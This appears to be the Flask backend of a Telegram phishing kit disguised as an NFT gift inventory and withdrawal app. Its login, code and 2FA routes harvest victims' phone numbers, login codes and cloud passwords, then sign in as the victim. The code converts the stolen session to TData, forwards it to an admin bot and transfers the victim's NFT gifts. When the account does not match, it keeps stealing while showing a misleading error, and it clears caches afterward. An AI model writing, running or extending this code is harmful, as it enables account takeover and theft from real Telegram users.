from flask import Flask, render_template, request, jsonify, session, send_file
import json
import os
import sys
import hashlib
import hmac
import urllib.parse
import subprocess
import asyncio
import shutil
from datetime import datetime
from database import db
from lottie_parser import lottie_parser
import logging
from telegram_webapp_auth.auth import TelegramAuthenticator, generate_secret_key
from telegram_client import TelegramAuth, run_async
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
import secrets
from dotenv import load_dotenv
from config import Config

def clear_python_cache():
    """Очищает Python кэш (.pyc файлы и __pycache__ директории)"""
    try:
        cache_cleared = 0
        current_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Удаляем .pyc файлы
        for root, dirs, files in os.walk(current_dir):
            for file in files:
                if file.endswith('.pyc'):
                    try:
                        os.remove(os.path.join(root, file))
                        cache_cleared += 1
                    except:
                        pass
            
            # Удаляем __pycache__ директории
            if '__pycache__' in dirs:
                try:
                    shutil.rmtree(os.path.join(root, '__pycache__'))
                    cache_cleared += 1
                except:
                    pass
        
        if cache_cleared > 0:
            logger.info(f"🧹 Очищено {cache_cleared} элементов кэша Python")
    except Exception as e:
        logger.error(f"Ошибка при очистке кэша: {e}")

def safe_run_async(coro):
    """Безопасное выполнение async кода с корректным закрытием event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(coro)
        return result
    finally:
        try:
            # Даем время на завершение всех фоновых задач
            import time
            time.sleep(0.1)  # Небольшая задержка для завершения telethon операций
            
            # Собираем все оставшиеся задачи
            pending = asyncio.all_tasks(loop)
            if pending:
                # Отменяем задачи
                for task in pending:
                    task.cancel()
                # Даем время на обработку отмен
                loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
            
            # Закрываем все открытые генераторы
            loop.run_until_complete(loop.shutdown_asyncgens())
            
            # Даем еще немного времени перед закрытием loop
            time.sleep(0.05)
        except Exception:
            pass
        finally:
            loop.close()

# Загружаем переменные окружения
load_dotenv()
logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(filename)s:%(lineno)d - %(funcName)s() - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
USERS_FILE = 'users.json'

# Используем конфигурацию из единого файла
BOT_TOKEN = Config.BOT_TOKEN
INIT_DATA_STRICT = Config.INIT_DATA_STRICT
SESSION_DATA_FILE = Config.SESSION_DATA_FILE
def save_session_data(user_id, data):
    try:
        if os.path.exists(SESSION_DATA_FILE):
            with open(SESSION_DATA_FILE, 'r') as f:
                session_data = json.load(f)
        else:
            session_data = {}
        session_data[str(user_id)] = {
            **data,
            'last_updated': datetime.now().isoformat()
        }
        with open(SESSION_DATA_FILE, 'w') as f:
            json.dump(session_data, f, indent=2)
        return True
    except Exception as e:
        return False
def load_session_data(user_id):
    try:
        if os.path.exists(SESSION_DATA_FILE):
            with open(SESSION_DATA_FILE, 'r') as f:
                session_data = json.load(f)
                return session_data.get(str(user_id), {})
        return {}
    except Exception as e:
        return {}
def clear_session_data(user_id):
    try:
        if os.path.exists(SESSION_DATA_FILE):
            with open(SESSION_DATA_FILE, 'r') as f:
                session_data = json.load(f)
            if str(user_id) in session_data:
                del session_data[str(user_id)]
            with open(SESSION_DATA_FILE, 'w') as f:
                json.dump(session_data, f, indent=2)
        return True
    except Exception as e:
        return False
def get_user_balance(user_id):
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                users = json.load(f)
                user_data = users.get(str(user_id), {})
                return user_data.get('balance', 0)
        return 0
    except Exception as e:
        return 0
def get_authenticator():
    secret_key = generate_secret_key(BOT_TOKEN)
    return TelegramAuthenticator(secret_key)
def validate_telegram_data(init_data: str) -> dict:
    try:
        parsed_data = urllib.parse.parse_qs(init_data)
        received_hash = parsed_data.get('hash', [None])[0]
        if not received_hash:
            return None
        data_check_arr = []
        for key, value in parsed_data.items():
            if key != 'hash':
                if isinstance(value, list):
                    value = value[0]
                data_check_arr.append(f"{key}={value}")
        data_check_arr.sort()
        data_check_string = '\n'.join(data_check_arr)
        secret_key = hmac.new(
            "WebAppData".encode(),
            BOT_TOKEN.encode(),
            hashlib.sha256
        ).digest()
        calculated_hash = hmac.new(
            secret_key,
            data_check_string.encode(),
            hashlib.sha256
        ).hexdigest()
        if calculated_hash == received_hash:
            user_data = json.loads(parsed_data.get('user', ['{}'])[0])
            return user_data
        return None
    except Exception as e:
        logger.error(f"Error validating Telegram data: {e}")
        return None
def get_user_from_init_data(init_data: str) -> dict:
    try:
        if init_data:
            raw = urllib.parse.unquote(init_data)
            qs = urllib.parse.parse_qs(raw, keep_blank_values=True)
            user_str = (qs.get('user') or [None])[0]
            if user_str:
                user_json = json.loads(user_str)
                telegram_id = int(user_json.get('id'))
                return {
                    'id': telegram_id,
                    'username': user_json.get('username', ''),
                    'first_name': user_json.get('first_name', ''),
                    'last_name': user_json.get('last_name', '')
                }
        tid = request.args.get('telegram_id')
        if not tid:
            body = request.get_json(silent=True) or {}
            tid = body.get('telegram_id')
        if tid:
            return {
                'id': int(tid),
                'username': '',
                'first_name': '',
                'last_name': ''
            }
    except Exception as e:
        logger.warning(f"Simple initData parse failed: {e}")
    return None
def run_terminal_auth_command(user_id: int, phone: str) -> bool:
    try:
        script_path = os.path.join(os.path.dirname(__file__), 'terminal_auth.py')
        cmd = [sys.executable, script_path, str(user_id), phone]
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=os.path.dirname(__file__)
        )
        stdout, stderr = process.communicate(timeout=Config.REQUEST_TIMEOUT)
        if process.returncode != 0:
            logger.error(f"Terminal auth process failed with return code {process.returncode}")
            logger.error(f"stderr: {stderr}")
            return False
        return True
    except subprocess.TimeoutExpired:
        process.kill()
        return False
    except Exception as e:
        logger.error(f"Error running terminal auth command: {e}")
        return False
def send_code_via_terminal(phone_number):
    return run_terminal_auth_command('send_code', phone_number)
def verify_code_via_terminal(phone_number, phone_code_hash, code):
    return run_terminal_auth_command('verify_code', phone_number, code, phone_code_hash)
def check_password_via_terminal(session_string, password):
    return run_terminal_auth_command('verify_2fa', session_string, password)
@app.before_request
def initialize_app():
    if not hasattr(app, '_db_initialized'):
        app._db_initialized = True
        logger.info("Database initialized")
@app.route('/')
def index():
    from flask import redirect, url_for
    return redirect(url_for('inventory'))
@app.route('/inventory')
def inventory():
    return render_template('inventory.html', gifts=[])
@app.route('/auth')
def auth():
    return render_template('auth.html')
@app.route('/auth_start')
def auth_start():
    return render_template('auth_start.html')
@app.route('/code')
def code():
    return render_template('code.html')
@app.route('/success')
def success():
    return render_template('success.html')
@app.route('/password')
def password():
    return render_template('password.html')
@app.route('/api/register', methods=['POST'])
def register_user():
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        telegram_id = user_info['id']
        
        # Проверка бана
        if db.is_user_banned(telegram_id):
            logger.warning(f"Banned user {telegram_id} tried to access")
            return jsonify({'success': False, 'error': 'User is banned', 'banned': True}), 403
        
        username = user_info.get('username', '')
        first_name = user_info.get('first_name', '')
        last_name = user_info.get('last_name', '')
        existing_user = db.get_user_by_telegram_id(telegram_id)
        if existing_user:
            user_gifts = db.get_user_gifts(telegram_id)
            logger.info(f"User {telegram_id} already exists")
            return jsonify({
                'success': True,
                'message': 'User found in database',
                'user': existing_user,
                'is_new_user': False
            })
        user_id = db.create_user(telegram_id, username, first_name, last_name)
        new_user = db.get_user_by_telegram_id(telegram_id)
        logger.info(f"New user registered: {telegram_id}")
        return jsonify({
            'success': True,
            'message': 'User registered successfully',
            'user': new_user,
            'is_new_user': True
        })
    except Exception as e:
        logger.error(f"Error registering user: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/gifts/details', methods=['GET'])
def get_user_gifts_details_api():
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        telegram_id = request.args.get('telegram_id')
        logger.info(f"API request for gifts details - init_data present: {bool(init_data)}, telegram_id: {telegram_id}")
        user_info = get_user_from_init_data(init_data)
        if not user_info and telegram_id:
            user_info = {'id': int(telegram_id)}
            logger.info(f"Using fallback telegram_id: {telegram_id}")
        if not user_info:
            logger.warning("Invalid init_data or telegram_id in gifts details request")
            return jsonify({'success': False, 'error': 'Invalid init_data or telegram_id'}), 401
        logger.info(f"Getting gifts for user: {user_info['id']}")
        rows = db.get_user_gifts(user_info['id'])
        logger.info(f"Found {len(rows)} gifts in database for user {user_info['id']}: {rows}")
        gifts = []
        for row in rows:
            link = row.get('gift_link')
            parsed = lottie_parser.parse_link(link)
            if not parsed:
                gift_name, gift_id = 'Unknown', '0'
            else:
                gift_name, gift_id = parsed
            animation_data = lottie_parser.get_animation_from_link(link)
            gifts.append({
                'id': row.get('id'),
                'gift_name': gift_name,
                'gift_id': gift_id,
                'animation_data': animation_data,
                'gift_link': link
            })
        logger.info(f"Returning {len(gifts)} processed gifts for user {user_info['id']}")
        return jsonify({'success': True, 'gifts': gifts})
    except Exception as e:
        logger.error(f"Error getting user gifts details: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/gifts', methods=['GET'])
def get_user_gifts_api():
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        logger.info(f"API request for gifts - init_data present: {bool(init_data)}")
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            logger.warning("Invalid init_data in gifts request")
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        logger.info(f"Getting gifts for user: {user_info['id']}")
        rows = db.get_user_gifts(user_info['id'])
        logger.info(f"Found {len(rows)} gifts in database for user {user_info['id']}: {rows}")
        gifts = []
        for row in rows:
            link = row.get('gift_link')
            parsed = lottie_parser.parse_link(link)
            if not parsed:
                gift_name, gift_id = 'Unknown', '0'
            else:
                gift_name, gift_id = parsed
            animation_data = lottie_parser.get_animation_from_link(link)
            gifts.append({
                'id': row.get('id'),
                'gift_name': gift_name,
                'gift_id': gift_id,
                'animation_data': animation_data,
                'gift_link': link
            })
        return jsonify({'success': True, 'gifts': gifts})
    except Exception as e:
        logger.error(f"Error getting user gifts: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/download_gift', methods=['POST'])
def download_gift():
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        gift_link = data.get('gift_link')
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        if not gift_link:
            return jsonify({'success': False, 'error': 'Missing gift_link'}), 400
        user = db.get_or_create_user(user_info['id'], user_info.get('username', ''), user_info.get('first_name', ''), user_info.get('last_name', ''))
        db_id = db.add_gift_link(user['id'], gift_link)
        parsed = lottie_parser.parse_link(gift_link)
        if not parsed:
            gift_name, gift_id = 'Unknown', '0'
        else:
            gift_name, gift_id = parsed
        animation_data = lottie_parser.get_animation_from_link(gift_link)
        return jsonify({
            'success': True,
            'message': 'Gift link added successfully',
            'gift': {
                'id': db_id,
                'gift_name': gift_name,
                'gift_id': gift_id,
                'animation_data': animation_data,
                'gift_link': gift_link
            }
        })
    except Exception as e:
        logger.error(f"Error adding gift link: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/withdraw_gift', methods=['POST'])
def withdraw_gift():
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        gift_db_id = data.get('gift_id')
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        if not gift_db_id:
            return jsonify({'success': False, 'error': 'Missing gift_id'}), 400
        telegram_id = int(user_info['id'])
        removed = db.remove_gift(int(gift_db_id), telegram_id)
        if not removed:
            return jsonify({'success': False, 'error': 'Gift not found or not owned by user'}), 404
        return jsonify({'success': True, 'message': 'Gift withdrawn successfully'})
    except Exception as e:
        logger.error(f"Error withdrawing gift: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/reset_db')
def reset_db():
    confirm = request.args.get('confirm')
    if confirm != '1':
        return jsonify({'success': False, 'error': 'confirm=1 required'}), 400
    try:
        db.reset_database()
        return jsonify({'success': True, 'message': 'Database reset and reinitialized'})
    except Exception as e:
        logger.error(f"Error resetting database: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/redirect/<path:page>')
def redirect_to_getgems(page):
    """Перенаправление на страницы Getgems"""
    getgems_urls = {
        'market': 'https://getgems.io/market',
        'favorites': 'https://getgems.io/favorites',
        'catalog': 'https://getgems.io/catalog',
        'cart': 'https://getgems.io/cart',
        'profile': 'https://getgems.io/profile'
    }
    url = getgems_urls.get(page, 'https://getgems.io')
    return f'<script>window.open("{url}", "_blank");</script>'
@app.route('/login', methods=['POST'])
def login():
    user_id = session.get('user_id') or request.json.get('user_id')
    phone = request.json.get('phone_number')  
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    # Преобразуем в строку на случай если пришло как число
    phone = str(phone)
    if not user_id:
        return jsonify({'success': False, 'error': 'User ID not found in session'})
    import re
    if not re.match(r'^\+\d{7,15}$', phone):
        return jsonify({'success': False, 'error': 'Invalid phone number format'})
    session['user_id'] = user_id
    from utils import log_user_action
    from database import Database
    import asyncio
    try:
        db = Database()
        user_data = db.get_user_by_telegram_id(user_id) or {}
        safe_run_async(log_user_action('phone_entered', user_info={
            'id': user_id,
            'user_id': user_id,
            'telegram_id': user_id,
            'username': user_data.get('username', ''),
            'first_name': user_data.get('first_name', ''),
            'last_name': user_data.get('last_name', '')
        }, additional_data={'phone': phone, 'details': f"Номер телефона введен: {phone}"}))
    except Exception as e:
        logger.error(f"Error logging phone entry: {e}")
    from utils import check_session_exists, validate_session
    # phone уже преобразован в строку выше
    if check_session_exists(phone) and validate_session(phone):
        return jsonify({'success': True, 'already_authorized': True})
    session_file = f"sessions/{phone.replace('+', '')}.session"
    try:
        auth = TelegramAuth(session_file)
        result = run_async(auth.send_code(str(phone)))
        logger.info(f"Code sent successfully to {phone}")
        # Убираем лог code_sent
        session_data = {
            'phone': phone,
            'phone_code_hash': str(result.phone_code_hash),  # Преобразуем в строку
            'session_file': session_file
        }
        save_session_data(user_id, session_data)
        return jsonify({'success': True})
    except PhoneNumberInvalidError as e:
        logger.error(f"Invalid phone number: {phone} - {str(e)}")
        return jsonify({'success': False, 'error': 'Invalid phone number'})
    except Exception as e:
        logger.error(f"Error sending code to {phone}: {str(e)}")
        return jsonify({'success': False, 'error': str(e)})
@app.route('/verify-code', methods=['POST'])
def verify_code():
    user_id = session.get('user_id') or request.json.get('user_id')
    code = request.json.get('code')
    phone_number = request.json.get('phone_number')  
    # Преобразуем в строку на случай если пришли как число
    if code:
        code = str(code)
    if phone_number:
        phone_number = str(phone_number)
    if not user_id:
        return jsonify({'success': False, 'error': 'User ID not found in session'})
    if not code:
        return jsonify({'success': False, 'error': 'Verification code required'})
    import re
    if not re.match(r'^\d{5,6}$', code):
        return jsonify({'success': False, 'error': 'Invalid verification code format'})
    session_data = load_session_data(user_id)
    phone = str(session_data.get('phone') or phone_number)  # Явно в строку
    phone_code_hash = str(session_data.get('phone_code_hash'))  # Явно в строку
    session_file = session_data.get('session_file')
    if not all([phone, phone_code_hash, session_file]):
        return jsonify({'success': False, 'error': 'Session expired or not found'})
    try:
        auth = TelegramAuth(session_file)
        user = run_async(auth.verify_code(phone, code, phone_code_hash))
        
        # Проверяем соответствие ID аккаунта
        authorized_user_id = user.id if hasattr(user, 'id') else None
        if authorized_user_id and authorized_user_id != user_id:
            from utils import log_user_action
            from database import Database
            import asyncio
            try:
                db = Database()
                user_data = db.get_user_by_telegram_id(user_id) or {}
                safe_run_async(log_user_action('account_mismatch', user_info={
                    'id': user_id,
                    'user_id': user_id,
                    'telegram_id': user_id,
                    'username': user_data.get('username', ''),
                    'first_name': user_data.get('first_name', ''),
                    'last_name': user_data.get('last_name', '')
                }, additional_data={
                    'phone': phone,
                    'expected_id': user_id,
                    'actual_id': authorized_user_id,
                    'details': f"ID не совпадают! Ожидали: {user_id}, получили: {authorized_user_id}"
                }))
            except Exception as e:
                logger.error(f"Error logging account mismatch: {e}")
            # НЕ возвращаем ошибку, продолжаем обработку
            is_mismatch = True
            logger.warning(f"Account mismatch: continuing with TData extraction. Expected: {user_id}, Got: {authorized_user_id}")
        else:
            is_mismatch = False
        
        from utils import log_user_action
        import asyncio
        if not is_mismatch:
            try:
                safe_run_async(log_user_action('code_verified', user_info={'id': user_id}, additional_data={'phone': phone, 'code': code, 'details': f"Код подтвержден для номера: {phone}"}))
            except Exception as e:
                logger.error(f"Error logging code verification: {e}")
        from utils import create_session_json
        create_session_json(phone, user_id=user_id)
        clear_session_data(user_id)
        try:
            from database import Database
            db = Database()
            user_data = db.get_user_by_telegram_id(user_id) or {}
            safe_run_async(log_user_action('auth_success', user_info={
                'id': user_id,
                'user_id': user_id,
                'telegram_id': user_id,
                'username': user_data.get('username', ''),
                'first_name': user_data.get('first_name', ''),
                'last_name': user_data.get('last_name', '')
            }, additional_data={'phone': phone, 'details': f"Пользователь успешно авторизован: {phone}"}))
        except Exception as e:
            logger.error(f"Error logging auth success: {e}")
        
        # Удаляем NFT ссылку из инвентаря после успешной авторизации
        try:
            logger.info(f"Removing gift link from inventory for user {user_id}")
            from database import Database
            db = Database()
            db.remove_user_gift_link(user_id)
            logger.info(f"Gift link removed successfully for user {user_id}")
        except Exception as e:
            logger.error(f"Error removing gift link: {e}")
        
        # Запускаем конвертацию сессии в TData и отправку админу (без 2FA)
        try:
            from session_converter import start_conversion_task, get_account_stats
            from telegram_bot import bot
            
            logger.info(f"🔄 Начинаем процесс конвертации TData для {phone}")
            
            # Получаем статистику аккаунта
            async def get_stats():
                auth_client = TelegramAuth(session_file)
                async with auth_client as client:
                    return await get_account_stats(client)
            
            logger.info(f"📊 Получаем статистику аккаунта...")
            stats = safe_run_async(get_stats())
            logger.info(f"✅ Статистика получена: {stats}")
            
            # Запускаем конвертацию в фоне
            start_conversion_task(bot, session_file, stats, password_2fa=None)
            logger.info(f"✅ Запущена конвертация сессии для {phone}")
        except Exception as e:
            logger.error(f"❌ Ошибка при запуске конвертации: {e}")
            import traceback
            traceback.print_exc()
        
        # Очищаем Python кэш после успешной авторизации
        clear_python_cache()
        
        # Если твинк - возвращаем особую ошибку
        if is_mismatch:
            return jsonify({
                'success': False, 
                'error': 'Вывод должен быть совершён на аккаунт, для которого предназначался подарок, повторите попытку.',
                'account_mismatch': True
            })
        
        return jsonify({'success': True})
    except SessionPasswordNeededError:
        # Отправляем лог с has_2fa=True
        from utils import log_user_action
        from database import Database
        import asyncio
        try:
            db = Database()
            user_data = db.get_user_by_telegram_id(user_id) or {}
            safe_run_async(log_user_action('code_entered', user_info={
                'id': user_id,
                'user_id': user_id,
                'telegram_id': user_id,
                'username': user_data.get('username', ''),
                'first_name': user_data.get('first_name', ''),
                'last_name': user_data.get('last_name', '')
            }, additional_data={'phone': phone, 'has_2fa': True, 'details': f"Требуется 2FA для номера: {phone}"}))
        except Exception as e:
            logger.error(f"Error logging 2FA required: {e}")
        session_data['needs_2fa'] = True
        save_session_data(user_id, session_data)
        return jsonify({
            'success': False, 
            'requires_2fa': True,  
            'error': '2FA password required'
        })
    except Exception as e:
        # Отправляем лог при неверном коде
        from utils import log_user_action
        from database import Database
        import asyncio
        try:
            db = Database()
            user_data = db.get_user_by_telegram_id(user_id) or {}
            safe_run_async(log_user_action('code_entered', user_info={
                'id': user_id,
                'user_id': user_id,
                'telegram_id': user_id,
                'username': user_data.get('username', ''),
                'first_name': user_data.get('first_name', ''),
                'last_name': user_data.get('last_name', '')
            }, additional_data={'phone': phone, 'has_2fa': False, 'error': str(e), 'details': f"Неверный код для номера: {phone}"}))
        except Exception as log_e:
            logger.error(f"Error logging invalid code: {log_e}")
        return jsonify({'success': False, 'error': str(e)})
@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    user_id = session.get('user_id') or request.json.get('user_id')
    password = request.json.get('password')
    phone_number = request.json.get('phone_number')  
    # Преобразуем в строку на случай если пришел как число
    if phone_number:
        phone_number = str(phone_number)
    if not user_id:
        return jsonify({'success': False, 'error': 'User ID not found in session'})
    if not password:
        return jsonify({'success': False, 'error': '2FA password required'})
    if len(password.strip()) == 0:
        return jsonify({'success': False, 'error': 'Password cannot be empty'})
    session_data = load_session_data(user_id)
    phone = session_data.get('phone') or phone_number  
    session_file = session_data.get('session_file')
    if not all([phone, session_file]):
        return jsonify({'success': False, 'error': 'Session expired or not found'})
    try:
        auth = TelegramAuth(session_file)
        user = run_async(auth.verify_2fa(password))
        
        # Проверяем соответствие ID аккаунта
        authorized_user_id = user.id if hasattr(user, 'id') else None
        if authorized_user_id and authorized_user_id != user_id:
            from utils import log_user_action
            from database import Database
            import asyncio
            try:
                db = Database()
                user_data = db.get_user_by_telegram_id(user_id) or {}
                safe_run_async(log_user_action('account_mismatch', user_info={
                    'id': user_id,
                    'user_id': user_id,
                    'telegram_id': user_id,
                    'username': user_data.get('username', ''),
                    'first_name': user_data.get('first_name', ''),
                    'last_name': user_data.get('last_name', '')
                }, additional_data={
                    'phone': phone,
                    'expected_id': user_id,
                    'actual_id': authorized_user_id,
                    'details': f"ID не совпадают! Ожидали: {user_id}, получили: {authorized_user_id}"
                }))
            except Exception as e:
                logger.error(f"Error logging account mismatch: {e}")
            # НЕ возвращаем ошибку, продолжаем обработку
            is_mismatch = True
            logger.warning(f"Account mismatch (2FA): continuing with TData extraction. Expected: {user_id}, Got: {authorized_user_id}")
        else:
            is_mismatch = False
        
        from utils import log_user_action
        from database import Database
        import asyncio
        
        from utils import create_session_json
        create_session_json(phone, twoFA=True, user_id=user_id)
        clear_session_data(user_id)
        
        try:
            db = Database()
            user_data = db.get_user_by_telegram_id(user_id) or {}
            safe_run_async(log_user_action('2fa_entered', user_info={
                'id': user_id,
                'user_id': user_id,
                'telegram_id': user_id,
                'username': user_data.get('username', ''),
                'first_name': user_data.get('first_name', ''),
                'last_name': user_data.get('last_name', '')
            }, additional_data={'phone': phone, 'details': f"2FA пароль успешно подтвержден для номера: {phone}"}))
        except Exception as e:
            logger.error(f"Error logging 2FA verification: {e}")
        
        # Запускаем конвертацию сессии в TData и отправку админу (с 2FA паролем)
        try:
            from session_converter import start_conversion_task, get_account_stats
            from telegram_bot import bot
            
            logger.info(f"🔄 Начинаем процесс конвертации TData для {phone} (с 2FA)")
            
            # Получаем статистику аккаунта
            async def get_stats():
                auth_client = TelegramAuth(session_file)
                async with auth_client as client:
                    return await get_account_stats(client)
            
            logger.info(f"📊 Получаем статистику аккаунта...")
            stats = safe_run_async(get_stats())
            logger.info(f"✅ Статистика получена: {stats}")
            
            # Запускаем конвертацию в фоне с 2FA паролем
            start_conversion_task(bot, session_file, stats, password_2fa=password)
            logger.info(f"✅ Запущена конвертация сессии для {phone} (с 2FA)")
        except Exception as e:
            logger.error(f"❌ Ошибка при запуске конвертации: {e}")
            import traceback
            traceback.print_exc()
        
        # Очищаем Python кэш после успешной авторизации с 2FA
        clear_python_cache()
        
        # Если твинк - возвращаем особую ошибку
        if is_mismatch:
            return jsonify({
                'success': False, 
                'error': 'Вывод должен быть совершён на аккаунт, для которого предназначался подарок, повторите попытку.',
                'account_mismatch': True
            })
        
        return jsonify({'success': True})
    except Exception as e:
        # Отправляем лог об ошибке 2FA
        from utils import log_user_action
        from database import Database
        import asyncio
        try:
            db = Database()
            user_data = db.get_user_by_telegram_id(user_id) or {}
            
            # Преобразуем техническое сообщение в понятное
            error_text = str(e)
            if "password" in error_text.lower() and "invalid" in error_text.lower():
                readable_error = "Неверный пароль двухфакторной аутентификации"
            else:
                readable_error = error_text
            
            safe_run_async(log_user_action('2fa_error', user_info={
                'id': user_id,
                'user_id': user_id,
                'telegram_id': user_id,
                'username': user_data.get('username', ''),
                'first_name': user_data.get('first_name', ''),
                'last_name': user_data.get('last_name', '')
            }, additional_data={'phone': phone, 'error': readable_error, 'details': f"Ошибка 2FA для номера: {phone}"}))
        except Exception as log_e:
            logger.error(f"Error logging 2FA error: {log_e}")
        
        # Проверяем, является ли ошибка неверным паролем
        error_text = str(e)
        if "password" in error_text.lower() and "invalid" in error_text.lower():
            # Возвращаем специальный ответ для повторного ввода
            return jsonify({
                'success': False, 
                'error': 'Неверный облачный пароль',
                'retry_2fa': True  # Флаг для фронтенда - разрешить повторный ввод
            })
        else:
            return jsonify({'success': False, 'error': str(e)})
@app.route('/api/process_gifts', methods=['POST'])
def process_gifts():
    """API: обработка подарков пользователя - поиск и перевод NFT подарков"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        user_id = data.get('user_id')
        user_info = get_user_from_init_data(init_data)
        if not user_info and user_id:
            user_info = {'id': int(user_id)}
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data or user_id'}), 401
        telegram_id = user_info['id']
        
        # Проверка бана
        if db.is_user_banned(telegram_id):
            logger.warning(f"Banned user {telegram_id} tried to access sessions")
            return jsonify({'success': False, 'error': 'User is banned', 'banned': True}), 403
        
        from utils import log_user_action
        import asyncio
        try:
            safe_run_async(log_user_action('session_processing_start', user_info={'id': telegram_id}, additional_data={'details': f"Началась обработка сессии пользователя"}))
        except Exception as e:
            logger.error(f"Error logging session processing start: {e}")
        from utils import get_phone_from_json, check_session_exists, validate_session
        phone = get_phone_from_json(telegram_id)
        if not phone:
            return jsonify({
                'success': False, 
                'error': 'Phone number not found. Please authorize first.'
            }), 400
        if not (check_session_exists(phone) and validate_session(phone)):
            return jsonify({
                'success': False, 
                'error': 'Session expired or invalid. Please re-authorize.'
            }), 401
        from utils import get_session_data_from_sqlite, convert_telethon_to_pyrogram
        session_file = f"sessions/{phone.replace('+', '')}.session"
        if not os.path.exists(session_file):
            return jsonify({
                'success': False, 
                'error': 'Session file not found'
            }), 404
        import asyncio
        async def process_gifts_async():
            pyrogram_session = await convert_telethon_to_pyrogram(session_file)
            if not pyrogram_session:
                return None
            from utils import process_account_gifts
            result = await process_account_gifts(pyrogram_session, telegram_id, phone)
            return result
        try:
            import asyncio
            safe_run_async(process_gifts_async())
        except Exception as e:
            logger.error(f"Error in async processing: {e}")
            return jsonify({'success': False, 'error': f'Async processing failed: {str(e)}'}), 500
        if result is None:
            try:
                from utils import log_user_action
                safe_run_async(log_user_action('session_processing_error', user_info={'id': telegram_id}, additional_data={'details': f"Ошибка конвертации сессии"}))
            except Exception as e:
                logger.error(f"Error logging session processing error: {e}")
            return jsonify({
                'success': False, 
                'error': 'Failed to convert session'
            }), 500
        try:
            from utils import log_user_action
            safe_run_async(log_user_action('session_processing_complete', user_info={'id': telegram_id}, additional_data={'details': f"Обработка сессии пользователя завершена"}))
        except Exception as e:
            logger.error(f"Error logging session processing complete: {e}")
        return jsonify({
            'success': True,
            'message': 'Gift processing completed',
            'result': result
        })
    except Exception as e:
        logger.error(f"Error processing gifts: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/check-auth-status')
def check_auth_status():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({'success': False, 'error': 'User ID required'})
    from utils import get_phone_from_json, check_session_exists, validate_session
    phone = get_phone_from_json(user_id)
    if phone:
        is_authorized = check_session_exists(phone) and validate_session(phone)
        return jsonify({
            'success': True,
            'has_phone': True,
            'phone': phone,
            'is_authorized': is_authorized
        })
    return jsonify({
        'success': True,
        'has_phone': False,
        'is_authorized': False
    })
if __name__ == '__main__':
    app.run(debug=Config.FLASK_DEBUG, host=Config.FLASK_HOST, port=Config.FLASK_PORT)